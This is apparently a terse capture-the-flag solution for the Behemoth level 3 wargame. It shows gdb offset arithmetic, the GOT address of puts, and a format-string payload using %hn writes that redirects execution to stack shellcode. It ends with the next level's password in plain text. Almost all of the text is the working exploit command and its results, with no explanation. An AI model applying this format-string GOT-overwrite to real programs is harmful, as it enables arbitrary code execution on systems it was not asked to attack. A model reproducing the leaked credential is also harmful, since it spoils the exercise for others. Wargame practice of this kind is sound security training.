shellcode at 0xffffdf14

080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0

(gdb) p 0xffff - 8
$1 = 65527

(gdb) p 0xdf14 - 8
$3 = 57100
(gdb)

(gdb) p 0xffff - 0xdf14
$4 = 8427
(gdb)

(echo -e "\xac\x97\x04\x08\xae\x97\x04\x08%57100x%1\$hn%8427x%2\$hn";cat )| ./behemoth3

behemoth4:ietheishei
